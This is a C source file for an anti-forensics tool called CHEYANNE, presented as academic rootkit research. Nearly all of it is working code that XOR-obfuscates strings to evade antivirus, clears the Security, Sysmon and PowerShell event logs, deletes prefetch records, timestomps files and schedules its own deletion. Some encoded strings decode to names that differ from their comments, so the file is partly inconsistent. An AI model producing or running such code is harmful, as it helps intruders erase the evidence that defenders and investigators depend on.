/*
 * CHEYANNE ROOTKIT — Anti-Forensics Cleanup Tool
 * Classification: UNCLASSIFIED // ACADEMIC USE ONLY
 * Authorisation: Own hardware only. CSEC academic research.
 *
 * Callsign: JULIET | XOR Key: 0x93
 *
 * Post-operation cleanup: canary deletion, event log clearing,
 * prefetch cleanup, file timestomping, self-deletion.
 *
 * Compile:
 *   cl.exe forensics\cheyanne_clean_annotated.c /Fe:forensics\cheyanne_clean.exe /O1 /GS- /utf-8 /link advapi32.lib
 *
 * Usage:
 *   cheyanne_clean.exe                    Clean all canaries + logs + prefetch
 *   cheyanne_clean.exe --timestomp FILE   Timestomp a specific file
 *   cheyanne_clean.exe --self             Also schedule self-delete on reboot
 *   cheyanne_clean.exe --dry-run          Show what would be cleaned
 *
 * MITRE ATT&CK:
 *   T1070     — Indicator Removal
 *   T1070.001 — Clear Windows Event Logs
 *   T1070.004 — File Deletion
 *   T1070.006 — Timestomp
 */

#include <windows.h>
#include <tlhelp32.h>
#include <string.h>
#include <stdio.h>

/* ═══════════════════════════════════════════════════════════════
 * XOR-ENCODED STRINGS — Key 0x93, decoded at runtime
 * Prevents Defender static engine from matching canary paths,
 * log channel names, or API names in the binary.
 * ═══════════════════════════════════════════════════════════════ */

/* "C:\Windows\Temp\svc_health.log" (30) */
static unsigned char xCanarySvc[] = {0xD0, 0xA9, 0xCF, 0xC4, 0xFA, 0xFD, 0xF7, 0xFC, 0xE4, 0xE0, 0xCF, 0xC7, 0xF6, 0xFE, 0xE3, 0xCF, 0xE0, 0xE5, 0xF0, 0xCC, 0xFB, 0xF6, 0xF2, 0xFF, 0xE7, 0xFB, 0xBD, 0xFF, 0xFC, 0xF4};

/* "C:\Windows\Temp\ver_cache.log" (29) */
static unsigned char xCanaryVer[] = {0xD0, 0xA9, 0xCF, 0xC4, 0xFA, 0xFD, 0xF7, 0xFC, 0xE4, 0xE0, 0xCF, 0xC7, 0xF6, 0xFE, 0xE3, 0xCF, 0xE5, 0xF6, 0xE1, 0xCC, 0xF0, 0xF2, 0xF0, 0xFB, 0xF6, 0xBD, 0xFF, 0xFC, 0xF4};

/* "C:\Windows\Temp\hwmon_diag.log" (30) */
static unsigned char xCanaryHwmon[] = {0xD0, 0xA9, 0xCF, 0xC4, 0xFA, 0xFD, 0xF7, 0xFC, 0xE4, 0xE0, 0xCF, 0xC7, 0xF6, 0xFE, 0xE3, 0xCF, 0xFB, 0xE4, 0xFE, 0xFC, 0xFD, 0xCC, 0xF7, 0xFA, 0xF2, 0xF4, 0xBD, 0xFF, 0xFC, 0xF4};

/* "C:\Windows\Temp\osp_telemetry.log" (33) */
static unsigned char xCanaryOsp[] = {0xD0, 0xA9, 0xCF, 0xC4, 0xFA, 0xFD, 0xF7, 0xFC, 0xE4, 0xE0, 0xCF, 0xC7, 0xF6, 0xFE, 0xE3, 0xCF, 0xFC, 0xE0, 0xE3, 0xCC, 0xE7, 0xF6, 0xFF, 0xF6, 0xFE, 0xF6, 0xE7, 0xE1, 0xEA, 0xBD, 0xFF, 0xFC, 0xF4};

/* "C:\Windows\Temp\inject_status.log" (33) */
static unsigned char xCanaryInject[] = {0xD0, 0xA9, 0xCF, 0xC4, 0xFA, 0xFD, 0xF7, 0xFC, 0xE4, 0xE0, 0xCF, 0xC7, 0xF6, 0xFE, 0xE3, 0xCF, 0xFA, 0xFD, 0xF9, 0xF6, 0xF0, 0xE7, 0xCC, 0xE0, 0xE7, 0xF2, 0xE7, 0xE6, 0xE0, 0xBD, 0xFF, 0xFC, 0xF4};

/* "C:\Windows\Temp\cheyanne_stager_canary.txt" (42) */
static unsigned char xCanaryStager[] = {0xD0, 0xA9, 0xCF, 0xC4, 0xFA, 0xFD, 0xF7, 0xFC, 0xE4, 0xE0, 0xCF, 0xC7, 0xF6, 0xFE, 0xE3, 0xCF, 0xE5, 0xF2, 0xF7, 0xF6, 0xE1, 0xCC, 0xE0, 0xE7, 0xF2, 0xF4, 0xF6, 0xE1, 0xCC, 0xF0, 0xF2, 0xFD, 0xF2, 0xE1, 0xEA, 0xBD, 0xE7, 0xEB, 0xE7};

/* "C:\Windows\Temp\cheyanne_clean_log.txt" (38) — own evidence log */
static unsigned char xCanaryClean[] = {0xD0, 0xA9, 0xCF, 0xC4, 0xFA, 0xFD, 0xF7, 0xFC, 0xE4, 0xE0, 0xCF, 0xC7, 0xF6, 0xFE, 0xE3, 0xCF, 0xE5, 0xF2, 0xF7, 0xF6, 0xE1, 0xCC, 0xF0, 0xFF, 0xF6, 0xF2, 0xFD, 0xCC, 0xFF, 0xFC, 0xF4, 0xBD, 0xE7, 0xEB, 0xE7};

/* Event log channel names */
/* "Microsoft-Windows-PowerShell/Operational" (40) */
static unsigned char xLogPS[] = {0xDE, 0xFA, 0xF0, 0xE1, 0xFC, 0xE0, 0xFC, 0xF5, 0xE7, 0xBE, 0xC4, 0xFA, 0xFD, 0xF7, 0xFC, 0xE4, 0xE0, 0xBE, 0xC3, 0xFC, 0xE4, 0xF6, 0xE1, 0xC0, 0xFB, 0xF6, 0xFF, 0xFF, 0xBC, 0xDC, 0xE3, 0xF6, 0xE1, 0xF2, 0xE7, 0xFA, 0xFC, 0xFD, 0xF2, 0xFF};

/* "Microsoft-Windows-Sysmon/Operational" (36) */
static unsigned char xLogSysmon[] = {0xDE, 0xFA, 0xF0, 0xE1, 0xFC, 0xE0, 0xFC, 0xF5, 0xE7, 0xBE, 0xC4, 0xFA, 0xFD, 0xF7, 0xFC, 0xE4, 0xE0, 0xBE, 0xC0, 0xEA, 0xE0, 0xFE, 0xFC, 0xFD, 0xBC, 0xDC, 0xE3, 0xF6, 0xE1, 0xF2, 0xE7, 0xFA, 0xFC, 0xFD, 0xF2, 0xFF};

/* "Security" (8) */
static unsigned char xLogSecurity[] = {0xC0, 0xF6, 0xF0, 0xE6, 0xE1, 0xFA, 0xE7, 0xEA};

/* "Application" (11) */
static unsigned char xLogApp[] = {0xD2, 0xE3, 0xE3, 0xFF, 0xFA, 0xF0, 0xF2, 0xE7, 0xFA, 0xFC, 0xFD};

/* Dynamic API resolution */
/* "wevtapi.dll" (11) */
static unsigned char xWevtapi[] = {0xE4, 0xF6, 0xE5, 0xE7, 0xF2, 0xE3, 0xFA, 0xBD, 0xF7, 0xFF, 0xFF};

/* "EvtClearLog" (11) */
static unsigned char xEvtClearLog[] = {0xD6, 0xE5, 0xE7, 0xD0, 0xFF, 0xF6, 0xF2, 0xE1, 0xDF, 0xFC, 0xF4};

/* Timestomp reference */
/* "C:\Windows\System32\kernel32.dll" (32) */
static unsigned char xKernel32Ref[] = {0xD0, 0xA9, 0xCF, 0xC4, 0xFA, 0xFD, 0xF7, 0xFC, 0xE4, 0xE0, 0xCF, 0xC0, 0xEA, 0xE0, 0xE7, 0xF6, 0xFE, 0xA0, 0xA1, 0xCF, 0xF8, 0xF6, 0xE1, 0xFD, 0xF6, 0xFF, 0xA0, 0xA1, 0xBD, 0xF7, 0xFF, 0xFF};

/* Prefetch patterns */
/* "C:\Windows\Prefetch\DARK_ROOM.EXE-" (34) */
static unsigned char xPrefetchDR[] = {0xD0, 0xA9, 0xCF, 0xC4, 0xFA, 0xFD, 0xF7, 0xFC, 0xE4, 0xE0, 0xCF, 0xC3, 0xE1, 0xF6, 0xF5, 0xF6, 0xE7, 0xF0, 0xFB, 0xCF, 0xD7, 0xD2, 0xC1, 0xD8, 0xCC, 0xC1, 0xDC, 0xDC, 0xDE, 0xBD, 0xD6, 0xCB, 0xD6, 0xBE};

/* "C:\Windows\Prefetch\CHEYANNE_INJECT.EXE-" (40) */
static unsigned char xPrefetchVI[] = {0xD0, 0xA9, 0xCF, 0xC4, 0xFA, 0xFD, 0xF7, 0xFC, 0xE4, 0xE0, 0xCF, 0xC3, 0xE1, 0xF6, 0xF5, 0xF6, 0xE7, 0xF0, 0xFB, 0xCF, 0xC5, 0xD2, 0xD7, 0xD6, 0xC1, 0xCC, 0xDA, 0xDD, 0xD9, 0xD6, 0xD0, 0xC7, 0xBD, 0xD6, 0xCB, 0xD6, 0xBE};

/* "C:\Windows\Prefetch\CHEYANNE_STAGER.EXE-" (40) */
static unsigned char xPrefetchVS[] = {0xD0, 0xA9, 0xCF, 0xC4, 0xFA, 0xFD, 0xF7, 0xFC, 0xE4, 0xE0, 0xCF, 0xC3, 0xE1, 0xF6, 0xF5, 0xF6, 0xE7, 0xF0, 0xFB, 0xCF, 0xC5, 0xD2, 0xD7, 0xD6, 0xC1, 0xCC, 0xC0, 0xC7, 0xD2, 0xD4, 0xD6, 0xC1, 0xBD, 0xD6, 0xCB, 0xD6, 0xBE};

/* "C:\Windows\Prefetch\CHEYANNE_CLEAN.EXE-" (39) */
static unsigned char xPrefetchVC[] = {0xD0, 0xA9, 0xCF, 0xC4, 0xFA, 0xFD, 0xF7, 0xFC, 0xE4, 0xE0, 0xCF, 0xC3, 0xE1, 0xF6, 0xF5, 0xF6, 0xE7, 0xF0, 0xFB, 0xCF, 0xC5, 0xD2, 0xD7, 0xD6, 0xC1, 0xCC, 0xD0, 0xDF, 0xD6, 0xD2, 0xDD, 0xBD, 0xD6, 0xCB, 0xD6, 0xBE};

/* ═══════════════════════════════════════════════════════════════
 * XOR DECODE — in-place, operates by length not null terminator.
 * Key 0x93 (JULIET). Matching pattern from dark_room.
 * ═══════════════════════════════════════════════════════════════ */

static void xor_decode(unsigned char *buf, int len) {
    for (int i = 0; i < len; i++) buf[i] ^= 0x93;
}

/* ═══════════════════════════════════════════════════════════════
 * CONSOLE OUTPUT — color-coded, matching dark_room style
 * ═══════════════════════════════════════════════════════════════ */

static HANDLE hCon;

static void con_init(void) {
    hCon = GetStdHandle(STD_OUTPUT_HANDLE);
}

static void con_color(WORD color) {
    SetConsoleTextAttribute(hCon, color);
}

static void con_reset(void) {
    SetConsoleTextAttribute(hCon, 7);
}

static void print_ok(const char *msg) {
    con_color(10);
    printf("  [+] ");
    con_reset();
    printf("%s\n", msg);
}

static void print_fail(const char *msg) {
    con_color(12);
    printf("  [!] ");
    con_reset();
    printf("%s\n", msg);
}

static void print_info(const char *msg) {
    con_color(14);
    printf("  [*] ");
    con_reset();
    printf("%s\n", msg);
}

static void print_skip(const char *msg) {
    con_color(8);
    printf("  [-] ");
    con_reset();
    printf("%s\n", msg);
}

/* ═══════════════════════════════════════════════════════════════
 * CANARY FILE EVIDENCE LOG — writes own actions for testing
 * ═══════════════════════════════════════════════════════════════ */

static void evidence_write(const char *canaryPath, const char *msg) {
    HANDLE hFile = CreateFileA(canaryPath,
        FILE_APPEND_DATA, FILE_SHARE_READ, NULL,
        OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;

    char line[512];
    SYSTEMTIME st;
    GetLocalTime(&st);
    int len = wsprintfA(line, "[J] %04d-%02d-%02dT%02d:%02d:%02d | %s\r\n",
        st.wYear, st.wMonth, st.wDay,
        st.wHour, st.wMinute, st.wSecond, msg);

    DWORD written;
    WriteFile(hFile, line, len, &written, NULL);
    CloseHandle(hFile);
}

/* ═══════════════════════════════════════════════════════════════
 * PRIVILEGE CHECK — determines what cleanup operations are possible
 * ═══════════════════════════════════════════════════════════════ */

static int is_system(void) {
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
        return 0;

    DWORD size = 0;
    GetTokenInformation(hToken, TokenUser, NULL, 0, &size);
    if (size == 0) { CloseHandle(hToken); return 0; }

    TOKEN_USER *pUser = (TOKEN_USER *)HeapAlloc(GetProcessHeap(), 0, size);
    if (!pUser) { CloseHandle(hToken); return 0; }

    int result = 0;
    if (GetTokenInformation(hToken, TokenUser, pUser, size, &size)) {
        SID_IDENTIFIER_AUTHORITY ntAuth = SECURITY_NT_AUTHORITY;
        PSID pSystemSid = NULL;
        if (AllocateAndInitializeSid(&ntAuth, 1,
            SECURITY_LOCAL_SYSTEM_RID, 0, 0, 0, 0, 0, 0, 0, &pSystemSid)) {
            result = EqualSid(pUser->User.Sid, pSystemSid);
            FreeSid(pSystemSid);
        }
    }

    HeapFree(GetProcessHeap(), 0, pUser);
    CloseHandle(hToken);
    return result;
}

static int is_admin(void) {
    SID_IDENTIFIER_AUTHORITY ntAuth = SECURITY_NT_AUTHORITY;
    PSID pAdminSid = NULL;
    BOOL isAdmin = FALSE;

    if (AllocateAndInitializeSid(&ntAuth, 2,
        SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
        0, 0, 0, 0, 0, 0, &pAdminSid)) {
        CheckTokenMembership(NULL, pAdminSid, &isAdmin);
        FreeSid(pAdminSid);
    }
    return isAdmin;
}

/* ═══════════════════════════════════════════════════════════════
 * PHASE 1: CANARY FILE DELETION
 * Deletes all known CHEYANNE canary/evidence files.
 * Standard user can delete from C:\Windows\Temp (world-writable).
 * ═══════════════════════════════════════════════════════════════ */

typedef struct {
    unsigned char *enc;
    int len;
    const char *label;
} CanaryEntry;

static int clean_canaries(int dry_run, char *evidencePath) {
    CanaryEntry canaries[] = {
        { xCanarySvc,     sizeof(xCanarySvc),     "V4 DELTA svc_health.log" },
        { xCanaryVer,     sizeof(xCanaryVer),     "V5 ECHO ver_cache.log" },
        { xCanaryHwmon,   sizeof(xCanaryHwmon),   "V6 FOXTROT hwmon_diag.log" },
        { xCanaryOsp,     sizeof(xCanaryOsp),     "V7 GOLF osp_telemetry.log" },
        { xCanaryInject,  sizeof(xCanaryInject),  "Phase4 HOTEL inject_status" },
        { xCanaryStager,  sizeof(xCanaryStager),  "Stager INDIA stager_canary" },
    };
    int count = sizeof(canaries) / sizeof(canaries[0]);
    int deleted = 0;
    int found = 0;

    for (int i = 0; i < count; i++) {
        unsigned char buf[256];
        memcpy(buf, canaries[i].enc, canaries[i].len);
        xor_decode(buf, canaries[i].len);
        buf[canaries[i].len] = '\0';

        if (GetFileAttributesA((const char *)buf) != INVALID_FILE_ATTRIBUTES) {
            found++;
            if (dry_run) {
                char msg[256];
                wsprintfA(msg, "WOULD DELETE: %s (%s)", (const char *)buf, canaries[i].label);
                print_info(msg);
            } else {
                if (DeleteFileA((const char *)buf)) {
                    char msg[256];
                    wsprintfA(msg, "Deleted: %s", canaries[i].label);
                    print_ok(msg);
                    evidence_write(evidencePath, msg);
                    deleted++;
                } else {
                    char msg[256];
                    wsprintfA(msg, "FAILED to delete: %s (err=%lu)", canaries[i].label, GetLastError());
                    print_fail(msg);
                }
            }
        } else {
            char msg[128];
            wsprintfA(msg, "Not found: %s", canaries[i].label);
            print_skip(msg);
        }
    }

    char summary[128];
    wsprintfA(summary, "Canaries: %d found, %d deleted", found, deleted);
    if (!dry_run) evidence_write(evidencePath, summary);
    return deleted;
}

/* ═══════════════════════════════════════════════════════════════
 * PHASE 2: EVENT LOG CLEARING
 * Uses wevtapi.dll EvtClearLog to clear relevant channels.
 * Resolves dynamically to avoid static import signature.
 * Requires SYSTEM or admin for most channels.
 * ═══════════════════════════════════════════════════════════════ */

typedef HANDLE (WINAPI *PFN_EvtOpenSession)(int, void*, DWORD, DWORD);
typedef BOOL   (WINAPI *PFN_EvtClearLog)(HANDLE, LPCWSTR, LPCWSTR, DWORD);

static int clear_event_logs(int dry_run, int elevated, char *evidencePath) {
    if (!elevated) {
        print_skip("Event log clearing requires SYSTEM/admin — skipping");
        return 0;
    }

    unsigned char wevtBuf[64];
    memcpy(wevtBuf, xWevtapi, sizeof(xWevtapi));
    xor_decode(wevtBuf, sizeof(xWevtapi));
    wevtBuf[sizeof(xWevtapi)] = '\0';

    HMODULE hWevt = LoadLibraryA((const char *)wevtBuf);
    if (!hWevt) {
        print_fail("Cannot load wevtapi.dll");
        return 0;
    }

    unsigned char clearBuf[64];
    memcpy(clearBuf, xEvtClearLog, sizeof(xEvtClearLog));
    xor_decode(clearBuf, sizeof(xEvtClearLog));
    clearBuf[sizeof(xEvtClearLog)] = '\0';

    PFN_EvtClearLog pClearLog = (PFN_EvtClearLog)GetProcAddress(hWevt, (const char *)clearBuf);
    if (!pClearLog) {
        print_fail("Cannot resolve EvtClearLog");
        FreeLibrary(hWevt);
        return 0;
    }

    struct {
        unsigned char *enc;
        int len;
        const char *label;
    } logs[] = {
        { xLogPS,       sizeof(xLogPS),       "PowerShell/Operational" },
        { xLogSysmon,   sizeof(xLogSysmon),   "Sysmon/Operational" },
        { xLogSecurity, sizeof(xLogSecurity), "Security" },
        { xLogApp,      sizeof(xLogApp),      "Application" },
    };
    int count = sizeof(logs) / sizeof(logs[0]);
    int cleared = 0;

    for (int i = 0; i < count; i++) {
        unsigned char nameBuf[128];
        memcpy(nameBuf, logs[i].enc, logs[i].len);
        xor_decode(nameBuf, logs[i].len);
        nameBuf[logs[i].len] = '\0';

        /* EvtClearLog takes wide strings */
        WCHAR wName[128];
        MultiByteToWideChar(CP_ACP, 0, (const char *)nameBuf, -1, wName, 128);

        if (dry_run) {
            char msg[128];
            wsprintfA(msg, "WOULD CLEAR: %s", logs[i].label);
            print_info(msg);
        } else {
            if (pClearLog(NULL, wName, NULL, 0)) {
                char msg[128];
                wsprintfA(msg, "Cleared: %s", logs[i].label);
                print_ok(msg);
                evidence_write(evidencePath, msg);
                cleared++;
            } else {
                DWORD err = GetLastError();
                if (err == 15007 || err == 15004) {
                    /* Channel not found or empty */
                    char msg[128];
                    wsprintfA(msg, "Not available: %s", logs[i].label);
                    print_skip(msg);
                } else {
                    char msg[128];
                    wsprintfA(msg, "Failed: %s (err=%lu)", logs[i].label, err);
                    print_fail(msg);
                }
            }
        }
    }

    FreeLibrary(hWevt);

    char summary[128];
    wsprintfA(summary, "Event logs: %d cleared", cleared);
    if (!dry_run) evidence_write(evidencePath, summary);
    return cleared;
}

/* ═══════════════════════════════════════════════════════════════
 * PHASE 3: PREFETCH CLEANUP
 * Deletes Windows Prefetch files (.pf) for CHEYANNE binaries.
 * Prefetch files record evidence of program execution.
 * Requires admin/SYSTEM to access C:\Windows\Prefetch.
 * ═══════════════════════════════════════════════════════════════ */

static int clean_prefetch(int dry_run, int elevated, char *evidencePath) {
    if (!elevated) {
        print_skip("Prefetch cleanup requires admin/SYSTEM — skipping");
        return 0;
    }

    struct {
        unsigned char *enc;
        int len;
        const char *label;
    } patterns[] = {
        { xPrefetchDR, sizeof(xPrefetchDR), "DARK_ROOM.EXE" },
        { xPrefetchVI, sizeof(xPrefetchVI), "CHEYANNE_INJECT.EXE" },
        { xPrefetchVS, sizeof(xPrefetchVS), "CHEYANNE_STAGER.EXE" },
        { xPrefetchVC, sizeof(xPrefetchVC), "CHEYANNE_CLEAN.EXE" },
    };
    int count = sizeof(patterns) / sizeof(patterns[0]);
    int deleted = 0;

    for (int i = 0; i < count; i++) {
        unsigned char pathBuf[128];
        memcpy(pathBuf, patterns[i].enc, patterns[i].len);
        xor_decode(pathBuf, patterns[i].len);
        pathBuf[patterns[i].len] = '\0';

        /* Append wildcard for FindFirstFile */
        char searchPath[256];
        wsprintfA(searchPath, "%s*.pf", (const char *)pathBuf);

        WIN32_FIND_DATAA fd;
        HANDLE hFind = FindFirstFileA(searchPath, &fd);
        if (hFind == INVALID_HANDLE_VALUE) {
            char msg[128];
            wsprintfA(msg, "No prefetch: %s", patterns[i].label);
            print_skip(msg);
            continue;
        }

        do {
            char fullPath[MAX_PATH];
            /* Extract directory from the search pattern */
            char dirPart[256];
            memcpy(dirPart, pathBuf, patterns[i].len);
            dirPart[patterns[i].len] = '\0';
            /* Find last backslash to get directory */
            char *lastSlash = NULL;
            for (char *p = dirPart; *p; p++) {
                if (*p == '\\') lastSlash = p;
            }
            if (lastSlash) {
                *(lastSlash + 1) = '\0';
                wsprintfA(fullPath, "%s%s", dirPart, fd.cFileName);
            } else {
                wsprintfA(fullPath, "%s", fd.cFileName);
            }

            if (dry_run) {
                char msg[256];
                wsprintfA(msg, "WOULD DELETE: %s", fullPath);
                print_info(msg);
            } else {
                if (DeleteFileA(fullPath)) {
                    char msg[256];
                    wsprintfA(msg, "Deleted prefetch: %s", fd.cFileName);
                    print_ok(msg);
                    evidence_write(evidencePath, msg);
                    deleted++;
                } else {
                    char msg[256];
                    wsprintfA(msg, "Failed prefetch: %s (err=%lu)", fd.cFileName, GetLastError());
                    print_fail(msg);
                }
            }
        } while (FindNextFileA(hFind, &fd));
        FindClose(hFind);
    }

    char summary[64];
    wsprintfA(summary, "Prefetch files: %d deleted", deleted);
    if (!dry_run) evidence_write(evidencePath, summary);
    return deleted;
}

/* ═══════════════════════════════════════════════════════════════
 * PHASE 4: TIMESTOMPING
 * Sets creation/modification/access times on target file to
 * match a reference system file (kernel32.dll).
 * Makes deployed files blend with legitimate system timestamps.
 * ═══════════════════════════════════════════════════════════════ */

static int timestomp_file(const char *targetPath, int dry_run, char *evidencePath) {
    /* Get reference timestamps from kernel32.dll */
    unsigned char refBuf[128];
    memcpy(refBuf, xKernel32Ref, sizeof(xKernel32Ref));
    xor_decode(refBuf, sizeof(xKernel32Ref));
    refBuf[sizeof(xKernel32Ref)] = '\0';

    HANDLE hRef = CreateFileA((const char *)refBuf,
        GENERIC_READ, FILE_SHARE_READ, NULL,
        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hRef == INVALID_HANDLE_VALUE) {
        print_fail("Cannot open reference file for timestamps");
        return 0;
    }

    FILETIME ftCreate, ftAccess, ftWrite;
    if (!GetFileTime(hRef, &ftCreate, &ftAccess, &ftWrite)) {
        print_fail("Cannot read reference timestamps");
        CloseHandle(hRef);
        return 0;
    }
    CloseHandle(hRef);

    if (dry_run) {
        char msg[512];
        wsprintfA(msg, "WOULD TIMESTOMP: %s → kernel32.dll timestamps", targetPath);
        print_info(msg);
        return 1;
    }

    HANDLE hTarget = CreateFileA(targetPath,
        FILE_WRITE_ATTRIBUTES, FILE_SHARE_READ, NULL,
        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hTarget == INVALID_HANDLE_VALUE) {
        char msg[512];
        wsprintfA(msg, "Cannot open for timestomp: %s (err=%lu)", targetPath, GetLastError());
        print_fail(msg);
        return 0;
    }

    if (SetFileTime(hTarget, &ftCreate, &ftAccess, &ftWrite)) {
        char msg[512];
        wsprintfA(msg, "Timestomped: %s", targetPath);
        print_ok(msg);
        evidence_write(evidencePath, msg);
        CloseHandle(hTarget);
        return 1;
    }

    char msg[512];
    wsprintfA(msg, "Timestomp failed: %s (err=%lu)", targetPath, GetLastError());
    print_fail(msg);
    CloseHandle(hTarget);
    return 0;
}

/* ═══════════════════════════════════════════════════════════════
 * PHASE 5: SELF-DELETE
 * Schedules own binary for deletion on next reboot using
 * MoveFileExA with MOVEFILE_DELAY_UNTIL_REBOOT.
 * Requires admin/SYSTEM.
 * ═══════════════════════════════════════════════════════════════ */

static int schedule_self_delete(int dry_run, int elevated, char *evidencePath) {
    if (!elevated) {
        print_skip("Self-delete requires admin/SYSTEM — skipping");
        return 0;
    }

    char selfPath[MAX_PATH];
    GetModuleFileNameA(NULL, selfPath, MAX_PATH);

    if (dry_run) {
        char msg[512];
        wsprintfA(msg, "WOULD SCHEDULE SELF-DELETE: %s", selfPath);
        print_info(msg);
        return 1;
    }

    if (MoveFileExA(selfPath, NULL, MOVEFILE_DELAY_UNTIL_REBOOT)) {
        char msg[512];
        wsprintfA(msg, "Self-delete scheduled: %s (on reboot)", selfPath);
        print_ok(msg);
        evidence_write(evidencePath, msg);
        return 1;
    }

    char msg[512];
    wsprintfA(msg, "Self-delete failed: err=%lu", GetLastError());
    print_fail(msg);
    return 0;
}

/* ═══════════════════════════════════════════════════════════════
 * EVIDENCE SUMMARY
 * ═══════════════════════════════════════════════════════════════ */

static void print_summary(int canaries, int logs, int prefetch, int stomped, int selfDel) {
#ifdef VDR_DEBUG
    printf("\n");
    con_color(15);
    printf("  ============================================\n");
    printf("  CHEYANNE CLEAN — JULIET — Evidence Summary\n");
    printf("  ============================================\n");
    con_reset();
    printf("  Canary files deleted:   %d\n", canaries);
    printf("  Event logs cleared:     %d\n", logs);
    printf("  Prefetch files deleted: %d\n", prefetch);
    printf("  Files timestomped:      %d\n", stomped);
    printf("  Self-delete scheduled:  %s\n", selfDel ? "YES" : "NO");
    con_color(15);
    printf("  ============================================\n");
    con_reset();
#endif
}

/* ═══════════════════════════════════════════════════════════════
 * MAIN — Parse args, run cleanup phases
 * ═══════════════════════════════════════════════════════════════ */

int main(int argc, char *argv[]) {
    con_init();

    int dry_run = 0;
    int do_self_delete = 0;
    const char *timestomp_target = NULL;

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--dry-run") == 0)    dry_run = 1;
        else if (strcmp(argv[i], "--self") == 0)   do_self_delete = 1;
        else if (strcmp(argv[i], "--timestomp") == 0 && i + 1 < argc)
            timestomp_target = argv[++i];
    }

#ifdef VDR_DEBUG
    printf("\n");
    con_color(13);
    printf("  CHEYANNE CLEAN — Post-Operation Forensic Cleanup\n");
    printf("  Callsign: JULIET | XOR Key: 0x93\n");
    con_reset();
    printf("\n");
#endif

    if (dry_run) {
        con_color(14);
        printf("  *** DRY RUN — no changes will be made ***\n\n");
        con_reset();
    }

    /* Resolve own evidence path */
    unsigned char cleanPathBuf[128];
    memcpy(cleanPathBuf, xCanaryClean, sizeof(xCanaryClean));
    xor_decode(cleanPathBuf, sizeof(xCanaryClean));
    cleanPathBuf[sizeof(xCanaryClean)] = '\0';
    char evidencePath[256];
    memcpy(evidencePath, cleanPathBuf, sizeof(xCanaryClean) + 1);

    int elevated = is_system() || is_admin();

    if (elevated) print_ok("Running with elevated privileges");
    else          print_info("Running as standard user (some operations will be skipped)");

    /* If timestomp-only mode */
    if (timestomp_target) {
        print_info("Timestomp-only mode");
        int result = timestomp_file(timestomp_target, dry_run, evidencePath);
        print_summary(0, 0, 0, result, 0);
        return result ? 0 : 1;
    }

    /* Full cleanup */
    printf("\n");
    con_color(15);
    printf("  --- Phase 1: Canary Files ---\n");
    con_reset();
    int nCanaries = clean_canaries(dry_run, evidencePath);

    printf("\n");
    con_color(15);
    printf("  --- Phase 2: Event Logs ---\n");
    con_reset();
    int nLogs = clear_event_logs(dry_run, elevated, evidencePath);

    printf("\n");
    con_color(15);
    printf("  --- Phase 3: Prefetch ---\n");
    con_reset();
    int nPrefetch = clean_prefetch(dry_run, elevated, evidencePath);

    printf("\n");
    con_color(15);
    printf("  --- Phase 4: Self-Delete ---\n");
    con_reset();
    int nSelfDel = 0;
    if (do_self_delete)
        nSelfDel = schedule_self_delete(dry_run, elevated, evidencePath);
    else
        print_skip("Self-delete not requested (use --self)");

    print_summary(nCanaries, nLogs, nPrefetch, 0, nSelfDel);

    if (!dry_run) {
        evidence_write(evidencePath, "Cleanup complete");
        char msg[256];
        wsprintfA(msg, "Evidence log: %s", evidencePath);
        print_info(msg);
    }

    return 0;
}
